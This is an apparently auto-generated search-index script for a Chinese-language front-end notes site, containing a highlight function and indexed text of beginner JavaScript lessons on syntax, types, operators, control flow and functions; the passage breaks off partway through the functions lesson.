const g=(o,a)=>{const i=o.toLowerCase(),e=a.toLowerCase(),s=[];let n=0,l=0;const c=(t,p=!1)=>{let r="";l===0?r=t.length>20?`… ${t.slice(-20)}`:t:p?r=t.length+l>100?`${t.slice(0,100-l)}… `:t:r=t.length>20?`${t.slice(0,20)} … ${t.slice(-20)}`:t,r&&s.push(r),l+=r.length,p||(s.push(["strong",a]),l+=a.length,l>=100&&s.push(" …"))};let h=i.indexOf(e,n);if(h===-1)return null;for(;h>=0;){const t=h+e.length;if(c(o.slice(n,h)),n=t,l>100)break;h=i.indexOf(e,n)}return l<100&&c(o.slice(n),!0),s},d=Object.entries,y=Object.keys,f=o=>o.reduce((a,{type:i})=>a+(i==="title"?50:i==="heading"?20:i==="custom"?10:1),0),$=(o,a)=>{var i;const e={};for(const[s,n]of d(a)){const l=((i=a[s.replace(/\/[^\\]*$/,"")])==null?void 0:i.title)||"",c=`${l?`${l} > `:""}${n.title}`,h=g(n.title,o);h&&(e[c]=[...e[c]||[],{type:"title",path:s,display:h}]),n.customFields&&d(n.customFields).forEach(([t,p])=>{p.forEach(r=>{const u=g(r,o);u&&(e[c]=[...e[c]||[],{type:"custom",path:s,index:t,display:u}])})});for(const t of n.contents){const p=g(t.header,o);p&&(e[c]=[...e[c]||[],{type:"heading",path:s+(t.slug?`#${t.slug}`:""),display:p}]);for(const r of t.contents){const u=g(r,o);u&&(e[c]=[...e[c]||[],{type:"content",header:t.header,path:s+(t.slug?`#${t.slug}`:""),display:u}])}}}return y(e).sort((s,n)=>f(e[s])-f(e[n])).map(s=>({title:s,contents:e[s]}))},m=JSON.parse("{\"/\":{\"/frontend/\":{\"title\":\"前端\",\"contents\":[]},\"/frontend/cssnotes/\":{\"title\":\"CSS\",\"contents\":[]},\"/frontend/htmlnotes/\":{\"title\":\"HTML\",\"contents\":[]},\"/frontend/javascriptnotes/01-JavaScript%E5%9F%BA%E7%A1%80-%E7%AE%80%E4%BB%8B.html\":{\"title\":\"JavaScript基础-简介\",\"contents\":[{\"header\":\"JavaScript 的组成\",\"slug\":\"javascript-的组成\",\"contents\":[\"ECMASCRIPT: 定义了 JavaScript 的语法规范, 描述了语言的基本语法和数据类型\",\"BOM (Browser Object Model): 浏览器对象模型\",\"有一套成熟的可以操作浏览器的 API，通过 BOM 可以操作浏览器。比如： 弹出框、浏览器跳转、获取分辨率等\",\"DOM (Document Object Model): 文档对象模型\",\"有一套成熟的可以操作页面元素的 API，通过 DOM 可以操作页面中的元素。比如： 增加一个 div，减少个一div，给 div 换个位置等\"]},{\"header\":\"JavaScript 用途\",\"slug\":\"javascript-用途\",\"contents\":[\"常见的网页效果，如表单验证，轮播图等\",\"与 H5配合实现游戏\",\"实现应用级别的程序\",\"实现图表统计效果\",\"可以实现人工智能\",\"后端开发，app开发，桌面端开发等\"]},{\"header\":\"JavaScript 的语言风格和特性\",\"slug\":\"javascript-的语言风格和特性\",\"contents\":[\"类 C 语言风格，容易上手\",\"弱类型（动态类型），简单易学\",\"丰富的功能，无敌的生态，强大的性能\"]}]},\"/frontend/javascriptnotes/02-JavaScript%E5%9F%BA%E7%A1%80-%E5%BC%95%E5%85%A5%E6%96%B9%E5%BC%8F.html\":{\"title\":\"JavaScript基础-引入方式\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"JavaScript 程序不能独立运行，它需要被嵌入 HTML 中，然后浏览器才能执行 JavaScript 代码。通过 script 标签将 JavaScript 代码引入到 HTML 中\"]},{\"header\":\"内部方式\",\"slug\":\"内部方式\",\"contents\":[\"通过 script 标签包裹 JavaScript 代码\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 引入方式</title> </head> <body> <!-- 内部形式：通过 script 标签包裹 JavaScript 代码 --> <script> // JavaScript代码 </script> </body> </html> \",\"注意：将 JavaScript 代码放在 HTML 页面的底部附近通常是最好的策略\"]},{\"header\":\"外部方式\",\"slug\":\"外部方式\",\"contents\":[\"一般将 JavaScript 代码写在独立的以 .js 结尾的文件中，然后通过 script 标签的 src 属性引入\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 引入方式</title> </head> <body> <!-- 外部形式：通过 script 的 src 属性引入独立的 .js 文件 --> <script src=\\\"xxx.js\\\"></script> </body> </html> \",\"如果 script 标签使用 src 属性引入了某 .js 文件，那么标签的代码会被忽略！！！\",\"如下代码所示：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 引入方式</title> </head> <body> <!-- 外部形式：通过 script 的 src 属性引入独立的 .js 文件 --> <script src=\\\"xxx.js\\\"> // 此处的代码会被忽略掉！！！！ // JavaScript代码 </script> </body> </html> \"]},{\"header\":\"内联方式\",\"slug\":\"内联方式\",\"contents\":[\"代码写在标签内部\",\"例：\",\"<body> <button onclick=\\\"alert('逗你玩~~~')“>点我</button> </body> \"]}]},\"/frontend/javascriptnotes/03-JavaScript%E5%9F%BA%E7%A1%80-%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA.html\":{\"title\":\"JavaScript基础-输入输出\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"输入和输出也可理解为人和计算机的交互，用户通过键盘、鼠标等向计算机输入信息，计算机处理后再展示结果给用户，这便是一次输入和输出的过程\",\"JavaScript本身没有任何打印或者输出的函数，但是我们可以使用其它方式输出和输入数据\"]},{\"header\":\"输出\",\"slug\":\"输出\",\"contents\":[\"JavaScript 可以接收用户的输入，然后再将输入的结果输出：alert()、document.write()、console.log()\",\"alert() 或 document.write() 会在浏览器中展示（输出）给用户\",\"console.log() 可以在控制台打印\",\"后面章节会深入探讨以上方法，目前学习的内容是为了方便我们在运行程序时看到结果\"]},{\"header\":\"输入\",\"slug\":\"输入\",\"contents\":[\"向 prompt() 输入任意内容会以弹窗形式出现在浏览器中，一般提示用户输入一些内容\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 输入输出</title> </head> <body> <script> // 1. 展示给用户 document.write('要输出的内容') alert('要输出的内容'); // 2. 以弹窗形式提示用户输入姓名，注意这里的文字使用英文的引号 prompt('请输入您的姓名:') </script> </body> </html> \"]}]},\"/frontend/javascriptnotes/04-JavaScript%E5%9F%BA%E7%A1%80-%E6%B3%A8%E9%87%8A%E4%B8%8E%E7%BB%93%E6%9D%9F%E7%AC%A6.html\":{\"title\":\"JavaScript基础-注释与结束符\",\"contents\":[{\"header\":\"注释\",\"slug\":\"注释\",\"contents\":[\"通过注释可以阻止代码被执行或者添加备注信息，JavaScript 支持两种形式注释语法\"]},{\"header\":\"单行注释\",\"slug\":\"单行注释\",\"contents\":[\"使用 // 注释单行代码\",\"VSCode中快捷键：ctrl+/\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 注释</title> </head> <body> <script> // 这种是单行注释的语法 // 一次只能注释一行 // 可以重复注释 </script> </body> </html> \"]},{\"header\":\"多行注释\",\"slug\":\"多行注释\",\"contents\":[\"使用 /* */ 注释多行代码\",\"VSCode中快捷键：shift+alt+A\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 注释</title> </head> <body> <script> /* 这种的是多行注释的语法 */ /* 更常见的多行注释是这种写法 可以任意换行 多少行都可以 */ </script> </body> </html> \"]},{\"header\":\"结束符\",\"slug\":\"结束符\",\"contents\":[\"在 JavaScript 中 ; 代表一段代码的结束，多数情况下可以省略 ; 使用回车（enter）替代\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 结束符</title> </head> <body> <script> alert(1); alert(2); alert(1) alert(2) </script> </body> </html> \",\"实际开发中有许多人主张书写 JavaScript 代码时省略结束符 ;\"]}]},\"/frontend/javascriptnotes/05-JavaScript%E5%9F%BA%E7%A1%80-%E5%8F%98%E9%87%8F.html\":{\"title\":\"JavaScript基础-变量\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"变量指的是在程序中保存数据的一个容器，变量是计算机内存中存储数据的标识符，根据变量名称可以获取到内存中存储的数据，也就是说，我们向内存中存储了一个数据，然后要给这个数据起一个名字，为了是我们以后再次找到它\"]},{\"header\":\"定义变量及赋值\",\"slug\":\"定义变量及赋值\",\"contents\":[\"// 定义一个变量 var num // 给一个变量赋值 num = 100 // 定义一个变量的同时给其赋值 var num2 = 200 \",\"注意：\",\"一个变量名只能存储一个值\",\"当再次给一个变量赋值的时候，前面一次的值就没有了\",\"变量名称区分大小写（JS 严格区分大小写）\"]},{\"header\":\"变量的命名规则和命名规范\",\"slug\":\"变量的命名规则和命名规范\",\"contents\":[\"规则： 必须遵守的，不遵守就是错\",\"一个变量名称可以由数字、字母、英文下划线 _、美元符号 $ 组成\",\"严格区分大小写\",\"不能由数字开头\",\"不能是保留字或者关键字\",\"不要出现空格\",\"规范： 建议遵守的（开发者默认），不遵守不会报错\",\"变量名尽量有意义（语义化）\",\"遵循驼峰命名规则，由多个单词组成的时候，从第二个单词开始首字母大写\",\"不要使用中文\"]},{\"header\":\"变量提示\",\"slug\":\"变量提示\",\"contents\":[\"变量声明的提升：可以提前使用一个稍后才声明的变量，而不会引发异常\",\"在执行所有代码前，JS 有预解析阶段，会预读所有变量的声明（不会提升赋值，只会提升定义）\",\"// 变量声明提升的只是定义，不提升赋值！！！ // 先使用变量 console.log(a) // undefined var a = 10 // 后定义变量 console.log(a) // 10 \",\"实际的情况相当于：\",\"var a console.log(a) // undefined a = 10 console.log(a) // 10 \"]}]},\"/frontend/javascriptnotes/06-JavaScript%E5%9F%BA%E7%A1%80-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.html\":{\"title\":\"JavaScript基础-数据类型\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"数据类型是指存储在内存中的数据的类型，通常分为两大类 基本数据类型 和 复杂数据类型\"]},{\"header\":\"基本数据类型\",\"slug\":\"基本数据类型\",\"contents\":[\"基本数据类型又叫做简单类型或者值类型，在存储时变量中存储的是值本身，因此叫做值类型，如 string，number，boolean，undefined，null\",\"数值类型（number） \",\"一切数字都是数值类型（包括二进制，十进制，十六进制等）\",\"NaN（not a number），一个非数字，NaN 代表一个计算错误，它是一个不正确的或一个未定义的数学操作所得到的结果，NaN 是粘性的，任何对 NaN 的操作都会返回 NaN\",\"字符串类型（string） \",\"被引号包裹的所有内容（可以是单引号''也可以是双引号\\\"\\\"）,单引号和双引号没有本质上的区别，推荐使用单引号\",\"注意： \",\"无论单引号或是双引号必须成对使用\",\"单引号/双引号可以互相嵌套，但是不可以自已嵌套自已\",\"必要时可以使用转义符 \\\\，输出单引号或双引号\",\"布尔类型（boolean） \",\"只有两个（true 或者 false）\",\"null类型（null） \",\"只有一个，就是 null，表示”空“、”无“或”值未知“的意思\",\"未定义类型（undefined） \",\"未定义是比较特殊的类型，只有一个值 undefined，只声明变量，不赋值的情况下，变量的默认值为 undefined，一般很少直接为某个变量赋值为 undefined\"]},{\"header\":\"复杂数据类型\",\"slug\":\"复杂数据类型\",\"contents\":[\"复杂数据类型，在存储时变量中存储的仅仅是地址（引用），因此叫做引用数据类型\",\"通过 new 关键字创建的对象（系统对象、自定义对象），如 Object、Array、Date 等\"]},{\"header\":\"判断数据类型\",\"slug\":\"判断数据类型\",\"contents\":[\"使用 typeof 关键字来检测数据类型\",\"// 第一种使用方式 var n1 = 100 console.log(typeof n1)// number // 第二种使用方式 var s1 = 'abcdefg' console.log(typeof(s1))// string \"]},{\"header\":\"数据类型转换\",\"slug\":\"数据类型转换\",\"contents\":[\"数据类型之间的转换，比如数字转成字符串，字符串转成布尔，布尔转成数字等\",\"JavaScript 是弱类型语言：JavaScript 也不知道变量到底属于哪种数据类型，只有赋值了才清楚\"]},{\"header\":\"其他数据类型转成数值\",\"slug\":\"其他数据类型转成数值\",\"contents\":[\"Number(变量)\",\"可以把一个变量强制转换成数值类型\",\"可以转换小数，会保留小数\",\"可以转换布尔值\",\"遇到不可转换的都会返回 NaN\",\"parseInt(变量)\",\"从第一位开始检查，是数字就转换，直到一个不是数字的内容\",\"开头就不是数字，那么直接返回 NaN\",\"不认识小数点，只能保留整数\",\"parseFloat(变量)\",\"从第一位开始检查，是数字就转换，直到一个不是数字的内容\",\"开头就不是数字，那么直接返回 NaN\",\"认识一次小数点\",\"除了加法以外的数学运算\",\"运算符两边都是可运算数字才行\",\"如果运算符任何一边不是一个可运算数字，那么就会返回 NaN\",\"加法不可以用\"]},{\"header\":\"其他数据类型转成字符串\",\"slug\":\"其他数据类型转成字符串\",\"contents\":[\"变量.toString()\",\"有一些数据类型不能使用 toString() 方法，比如 undefined 和 null\",\"String(变量)\",\"所有数据类型都可以\",\"使用加法运算\",\"在 JS 里面，+ 由两个含义 \",\"字符串拼接： 只要 + 任意一边是字符串，就会进行字符串拼接\",\"加法运算：只有 + 两边都是数字的时候，才会进行数学运算\"]},{\"header\":\"其他数据类型转成布尔\",\"slug\":\"其他数据类型转成布尔\",\"contents\":[\"Boolean(变量)\",\"在 js 中，只有 ''、0、null、undefined、NaN，这些是 false\",\"其余都是 true\"]},{\"header\":\"数据类型之间存储的区别\",\"slug\":\"数据类型之间存储的区别\",\"contents\":[\"既然我们区分了基本数据类型和复杂数据类型，那么他们之间就一定会存在一些区别，他们最大的区别就是在存储上的区别\",\"我们的存储空间分成两种：\",\"栈： 主要存储基本数据类型的内容\",\"堆： 主要存储复杂数据类型的内容\"]},{\"header\":\"基本数据类型在内存中的存储情况\",\"slug\":\"基本数据类型在内存中的存储情况\",\"contents\":[\"var num = 100，在内存中的存储情况，直接在 栈空间 内有存储一个数据\"]},{\"header\":\"复杂数据类型在内存中的存储情况\",\"slug\":\"复杂数据类型在内存中的存储情况\",\"contents\":[\"复杂数据类型的存储\",\"在堆里面开辟一个存储空间\",\"把数据存储到存储空间内\",\"把存储空间的地址赋值给栈里面的变量\"]},{\"header\":\"数据类型之间比较的区别\",\"slug\":\"数据类型之间比较的区别\",\"contents\":[\"基本数据类型是 值 之间的比较\",\"var num = 1 var str = '1' console.log(num == str) // true \",\"复杂数据类型是 地址 之间的比较\",\"var obj = { name: 'Jack' } var obj2 = { name: 'Jack' } console.log(obj == obj2) // false \",\"因为我们创建了两个对象，那么就会在 堆空间 里面开辟两个存储空间存储数据（两个地址），虽然存储的内容是一样的，那么也是两个存储空间，两个地址，复杂数据类型之间就是地址的比较，所以 obj 和 obj2 两个变量的地址不一样，所以我们得到的就是 false\"]}]},\"/frontend/javascriptnotes/07-JavaScript%E5%9F%BA%E7%A1%80-%E8%BF%90%E7%AE%97%E7%AC%A6.html\":{\"title\":\"JavaScript基础-运算符\",\"contents\":[{\"header\":\"算术运算符\",\"slug\":\"算术运算符\",\"contents\":[\"算术运算符：也叫数学运算符，主要包括加、减、乘、除、取余（求模）等\",\"+\",\"只有符号两边都是数字的时候才会进行加法运算\",\"只要符号任意一边是字符串类型，就会进行字符串拼接\",\"-\",\"会执行减法运算\",\"会自动把两边都转换成数字进行运算\",\"*\",\"会执行乘法运算\",\"会自动把两边都转换成数字进行运算\",\"/\",\"会执行除法运算\",\"会自动把两边都转换成数字进行运算\",\"%\",\"会执行取余运算\",\"会自动把两边都转换成数字进行运算\",\"注意：在计算失败时，显示的结果是 NaN（not a number）\"]},{\"header\":\"赋值运算符\",\"slug\":\"赋值运算符\",\"contents\":[\"赋值运算符：对变量进行赋值的运算符\",\"= 将等号右边的值赋予给左边, 要求左边必须是一个容器\",\"运算符\",\"作用\",\"+=\",\"加法赋值\",\"-+\",\"减法赋值\",\"*=\",\"乘法赋值\",\"/=\",\"除法赋值\",\"%=\",\"取余赋值\"]},{\"header\":\"比较运算符\",\"slug\":\"比较运算符\",\"contents\":[\"使用场景：比较两个数据是否相等，根据比较结果返回一个布尔值（true / false）\",\"运算符\",\"作用\",\">\",\"左边是否大于右边\",\"<\",\"左边是否小于右边\",\">=\",\"左边是否大于或等于右边\",\"<=\",\"左边是否小于或等于右边\",\"===\",\"左右两边是否类型和值都相等（重点）\",\"==\",\"左右两边值是否相等\",\"!=\",\"左右值不相等\",\"!==\",\"左右两边是否不全等\",\"例：\",\" console.log(3 > 5) console.log(3 >= 3) console.log(2 == 2) // 比较运算符有隐式转换 把'2' 转换为 2 双等号 只判断值 console.log(2 == '2') // true // console.log(undefined === null) // === 全等 判断 值 和 数据类型都一样才行 // 以后判断是否相等 请用 === console.log(2 === '2') console.log(NaN === NaN) // NaN 不等于任何人，包括他自己 console.log(2 !== '2') // true console.log(2 != '2') // false console.log('-------------------------') console.log('a' < 'b') // true console.log('aa' < 'ab') // true console.log('aa' < 'aac') // true console.log('-------------------------') \"]},{\"header\":\"逻辑运算符\",\"slug\":\"逻辑运算符\",\"contents\":[]},{\"header\":\"基本使用\",\"slug\":\"基本使用\",\"contents\":[\"使用场景：可以把多个布尔值放到一起运算，最终返回一个布尔值\",\"符号\",\"名称\",\"日常读法\",\"特点\",\"口诀\",\"&&\",\"逻辑与\",\"并且\",\"符号两边有一个假的结果为假\",\"一假则假\",\"||\",\"逻辑或\",\"或者\",\"符号两边有一个真的结果为真\",\"一真则真\",\"!\",\"逻辑非\",\"取反\",\"true变false false变true\",\"真变假，假变真\",\"A\",\"B\",\"A && B\",\"A || B\",\"!A\",\"false\",\"false\",\"false\",\"false\",\"true\",\"false\",\"true\",\"false\",\"true\",\"true\",\"true\",\"false\",\"false\",\"true\",\"false\",\"true\",\"true\",\"true\",\"true\",\"false\",\" // 逻辑与 一假则假 console.log(true && true) console.log(false && true) console.log(3 < 5 && 3 > 2) console.log(3 < 5 && 3 < 2) console.log('-----------------') // 逻辑或 一真则真 console.log(true || true) console.log(false || true) console.log(false || false) console.log('-----------------') // 逻辑非 取反 console.log(!true) console.log(!false) console.log('-----------------') let num = 6 console.log(num > 5 && num < 10) console.log('-----------------') \"]},{\"header\":\"逻辑中断\",\"slug\":\"逻辑中断\",\"contents\":[\"断路：只存在于 && 和 || 中，当满足一定条件会让右边代码不执行\",\"符号\",\"短路条件\",\"&&\",\"左边为 false 就断路\",\"||\",\"左边为 true 就断路\",\"原因：通过左边能得到整个式子的结果，因此没必要再判断右边\",\"运算结果：无论 && 还是 ||，运算结果都是最后被执行的表达式值，一般用在变量赋值\",\"例：\",\"console.log(false && 20) //false console.log(5 < 3 && 20) //false console.log(undefined && 20) //undefined console.log(null && 20) //null console.log(0 && 20) //0 console.log(10 && 20) //20 console.log(false || 20) //20 console.log(5 < 3 || 20) //20 console.log(undefined || 20) //20 console.log(null || 20) //20 console.log(0 || 20) //20 console.log(10 || 20) //10 \"]},{\"header\":\"逻辑运算符优先级\",\"slug\":\"逻辑运算符优先级\",\"contents\":[\"！> && > ||\"]},{\"header\":\"自增自减运算符\",\"slug\":\"自增自减运算符\",\"contents\":[\"++\",\"进行自增运算\",\"分成两种，前置++ 和 后置++\",\"前置++，会先把值自动 +1，再返回\",\"var a = 10 console.log(++a) // 会返回 11，并且把 a 的值变成 11 \",\"后置++，会先把值返回，再自动+1\",\"var a = 10 console.log(a++) // 会返回 10，然后把 a 的值变成 11 \",\"--\",\"进行自减运算\",\"分成两种，前置-- 和 后置--\",\"和 ++ 运算符道理一样\"]},{\"header\":\"三元运算符\",\"slug\":\"三元运算符\",\"contents\":[\"三元运算，就是用 两个符号 组成一个语句\",\"语法：\",\"条件 ? 条件为 true 的时候执行 : 条件为 false 的时候执行 \",\"例：\",\"var age = 18 age >= 18 ? alert('已经成年') : alert('没有成年') \"]}]},\"/frontend/javascriptnotes/08-JavaScript%E5%9F%BA%E7%A1%80-%E5%88%86%E6%94%AF%E7%BB%93%E6%9E%84.html\":{\"title\":\"JavaScript基础-分支结构\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"分支结构可以根据条件判断真假，来选择性的执行想要的代码\",\"分支结构包含：\",\"if分支结构（重点）\",\"三元运算符\",\"switch分支结构\"]},{\"header\":\"if条件分支结构\",\"slug\":\"if条件分支结构\",\"contents\":[]},{\"header\":\"if分支结构\",\"slug\":\"if分支结构\",\"contents\":[\"语法：\",\"if(条件表达式) { // 满足条件要执行的语句 } \",\"小括号内的条件结果是布尔值，为 true 时，进入大括号里执行代码，若为 false ，则不执行大括号里面代码\",\"小括号内的结果若不是布尔类型时，会发生类型转换为布尔值，类似Boolean()\",\"如果大括号只有一个语句，大括号可以省略，但是，不提倡这样做\",\"例：\",\"// 1. 用户输入 var score = +prompt('请输入成绩') // 2. 进行判断输出 if (score >= 700) { alert('恭喜考上清华！') } \"]},{\"header\":\"if双分支结构\",\"slug\":\"if双分支结构\",\"contents\":[\"如果有两个条件的时候，可以使用 if else 双分支语句\",\"语法：\",\"if (条件表达式){ // 满足条件要执行的语句 } else { // 不满足条件要执行的语句 } \",\"例：\",\"// 1. 用户输入 var uname = prompt('请输入用户名:') var pwd = prompt('请输入密码:') // 2. 判断输出 if (uname === 'zhf' && pwd === '123456') { alert('恭喜登录成功') } else { alert('用户名或者密码错误') } \"]},{\"header\":\"if多分支结构\",\"slug\":\"if多分支结构\",\"contents\":[\"使用场景： 适合于有多个条件的时候\",\"例：\",\"// 1. 用户输入 var score = +prompt('请输入成绩：') // 2. 判断输出 if (score >= 90) { alert('成绩优秀，宝贝，你是我的骄傲') } else if (score >= 70) { alert('成绩良好，宝贝，你要加油哦~~') } else if (score >= 60) { alert('成绩及格，宝贝，你很危险~') } else { alert('成绩不及格，宝贝，我不想和你说话，我只想用鞭子和你说话~') } \"]},{\"header\":\"switch条件分支结构\",\"slug\":\"switch条件分支结构\",\"contents\":[\"使用场景： 适用于有多个条件的时候，也属于分支语句，大部分情况下和 if 多分支语句功能相同\",\"语法：\",\"switch (要判断的变量) { case 情况1: 情况1要执行的代码 break case 情况2: 情况2要执行的代码 break case 情况3: 情况3要执行的代码 break default: 上述情况都不满足的时候执行的代码 } \",\"例：根据变量给出的数字显示是星期几\",\"var week = 1 switch (week) { case 1: alert('星期一') break case 2: alert('星期二') break case 3: alert('星期三') break case 4: alert('星期四') break case 5: alert('星期五') break case 6: alert('星期六') break case 7: alert('星期日') break default: alert('请输入一个 1 ～ 7 之间的数字') } \",\"注意：\",\"switch case 语句一般用于等值判断, if 适合于区间判断\",\"switch case 一般需要配合 break 关键字使用，没有 break 会造成 case 穿透\",\"if 多分支语句开发要比 switch 更重要，使用也更多\"]},{\"header\":\"if和switch的区别\",\"slug\":\"if和switch的区别\",\"contents\":[\"共同点 \",\"都能实现多分支选择，多选一\",\"大部分情况下可以互换\",\"区别： \",\"switch…case 语句通常处理 case 为比较确定值的情况，而 if…else…语句更加灵活，通常用于范围判断(大于，等于某个范围)\",\"switch 语句进行判断后直接执行到程序的语句，效率更高，而 if…else 语句有几种判断条件，就得判断多少次\",\"switch 一定要注意必须是 === 全等，一定注意数据类型，同时注意 break 否则会有穿透效果\",\"结论： \",\"当分支比较少时，if…else 语句执行效率高\",\"当分支比较多时，switch 语句执行效率高，而且结构更清晰\"]}]},\"/frontend/javascriptnotes/09-JavaScript%E5%9F%BA%E7%A1%80-%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84.html\":{\"title\":\"JavaScript基础-循环结构\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"循环结构，就是根据某些给出的条件，重复的执行同一段代码\",\"循环三要素：\",\"初始值 （经常用变量）\",\"终止条件\",\"变量的变化量\"]},{\"header\":\"while循环\",\"slug\":\"while循环\",\"contents\":[\"while，中文叫当…时，其实就是当条件满足时就执行代码，一旦不满足了就不执行了\",\"语法：\",\"while (条件表达式) { // 循环体 } \",\"因为满足条件就执行，所以我们写的时候一定要注意，就是设定一个边界值，不然就一直循环下去了\",\"例：\",\"// 1. 初始值 var num = 0; // 2. 终止条件 while (num < 10) { // 3. 要执行的代码 console.log('当前的 num 的值是 ' + num) // 4. 变量的变化量 num = num + 1 } \"]},{\"header\":\"do while循环\",\"slug\":\"do-while循环\",\"contents\":[\"是一个和 while 循环类似的循环，while 会先进行条件判断，满足就执行，不满足直接就不执行了，但是 do while 循环是先不管条件，先执行一回，然后再开始进行条件判断\",\"语法：\",\"do { 要执行的代码 } while (条件) \",\"例：\",\"// 下面这个代码，条件一开始就不满足，但是依旧会执行一次 do 后面 {} 内部的代码 var num = 10 do { console.log('我执行了一次') num = num + 1 } while (num < 10) \"]},{\"header\":\"for循环\",\"slug\":\"for循环\",\"contents\":[\"语法：\",\"for(起始值; 终止条件; 变化量) { // 要重复执行的代码 } \",\"例：\",\"// 把初始化，条件判断，自身改变，写在了一起 for (var i = 1; i <= 10; i++) { // 这里写的是要执行的代码 console.log(i) } // 控制台会依次输出 1 ~ 10 \"]},{\"header\":\"for循环嵌套\",\"slug\":\"for循环嵌套\",\"contents\":[\"循环之中又嵌套了另一个循环，外层循环循环一次，里层循环循环全部\",\"例：\",\"// 1. 外面的循环 for (var i = 1; i < 4; i++) { console.log(i) // 2. 里层的循环 for (let j = 1; j < 6; j++) { console.log(j) } } \"]},{\"header\":\"break终止循环\",\"slug\":\"break终止循环\",\"contents\":[\"在循环没有进行完毕的时候，因为我设置的条件满足，提前终止循环\",\"比如：我要吃五个包子，吃到三个的时候，不能再吃了，我就停止吃包子这个事情\",\"要终止循环，就可以直接使用 break 关键字\",\"for (var i = 1; i <= 5; i++) { // 每循环一次，吃一个包子 console.log('我吃了一个包子') // 当 i 的值为 3 的时候，条件为 true，执行 {} 里面的代码终止循环 // 循环就不会继续向下执行了，也就没有 4 和 5 了 if (i === 3) { break } } \"]},{\"header\":\"continue结束本次循环\",\"slug\":\"continue结束本次循环\",\"contents\":[\"在循环中，把循环的本次跳过去，继续执行后续的循环\",\"比如：吃五个包子，到第三个的时候，第三个掉地下了，不吃了，跳过第三个，继续吃第四个和第五个\",\"跳过本次循环，就可以使用 continue 关键字\",\"for (var i = 1; i <= 5; i++) { // 当 i 的值为 3 的时候，执行 {} 里面的代码 // {} 里面有 continue，那么本次循环后面的代码就都不执行了 // 自动算作 i 为 3 的这一次结束了，去继续执行 i = 4 的那次循环了 if (i === 3) { console.log('这个是第三个包子，掉地下了，我不吃了') continue } console.log('我吃了一个包子') } \"]}]},\"/frontend/javascriptnotes/10-JavaScript%E5%9F%BA%E7%A1%80-%E5%87%BD%E6%95%B0.html\":{\"title\":\"JavaScript基础-函数\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"对于 js 来说，函数就是把任意一段代码放在一个 盒子 里面\",\"在我想要让这段代码执行的时候，直接执行这个 盒子 里面的代码就行\",\"// 这个是我们以前写的一段代码 for (var i = 0; i < 10; i++) { console.log(i) } // 函数，这个 {} 就是那个 “盒子” function fn() { // 这个函数我们以前写的代码 for (var i = 0; i < 10; i++) { console.log(i) } } \"]},{\"header\":\"函数定义阶段\",\"slug\":\"函数定义阶段\",\"contents\":[\"定义阶段就是我们把代码 放在盒子里面\",\"我们就要学习怎么 放进去，也就是书写一个函数\",\"我们有两种定义方式 声明式 和 赋值式\"]},{\"header\":\"声明式\",\"slug\":\"声明式\",\"contents\":[\"使用 function 这个关键字来声明一个函数\",\"语法：\",\"function fn() { // 一段代码,即函数体 } // function: 声明函数的关键字，表示接下来是一个函数了 // fn: 函数的名字，我们自己定义的（遵循变量名的命名规则和命名规范） // (): 必须写，是用来放参数的位置（一会我们再聊） // {}: 就是我们用来放一段代码的位置（也就是我们刚才说的 “盒子”） \"]},{\"header\":\"赋值式\",\"slug\":\"赋值式\",\"contents\":[\"其实就是和我们使用 var 关键字是一个道理了\",\"首先使用 var 定义一个变量，把一个函数当作值直接赋值给这个变量就可以了\",\"语法：\",\"var fn = function () { // 一段代码，即函数体 } // 不需要在 function 后面书写函数的名字了，因为在前面已经有了 \"]},{\"header\":\"函数调用阶段\",\"slug\":\"函数调用阶段\",\"contents\":[]},{\"header\":\"函数的调用方式\",\"slug\":\"函数的调用方式\",\"contents\":[\"就是让 盒子里面 的代码执行一下\",\"两种定义函数的方式不同，但是调用函数的方式都以一样的\",\"函数调用就是直接写 函数名() 就可以了\",\"// 声明式函数 function fn() { console.log('我是 fn 函数') } fn() // 调用函数 // 赋值式函数 var fn2 = function () { console.log('我是 fn2 函数') } fn() // 调用函数 \",\"注意：定义完一个函数以后，如果没有函数调用，那么写在 {} 里面的代码没有意义，只有调用以后才会执行\"]},{\"header\":\"调用上的区别\",\"slug\":\"调用上的区别\",\"contents\":[\"虽然两种定义方式的调用都是一样的，但是还是有一些区别的\",\"声明式函数： 调用可以在定义之前或者定义之后\",\"fn() // 可以调用 // 声明式函数 function fn() { console.log('我是 fn 函数') } fn() // 可以调用 \",\"赋值式函数： 调用只能在定义之后\",\"fn() // 会报错 // 赋值式函数 var fn = function () { console.log('我是 fn 函数') } fn() // 可以调用 \"]},{\"header\":\"函数的参数\",\"slug\":\"函数的参数\",\"contents\":[\"我们在定义函数和调用函数的时候都出现过 ()，现在我们就来说一下这个 () 的作用，就是用来放参数的\",\"参数分为两种 形参 和 实参\",\"// 声明式 function fn(形参写在这里) { // 一段代码 } fn(实参写在这里) // 赋值式函数 var fn = function (形参写在这里) { // 一段代码 } fn(实参写在这里) 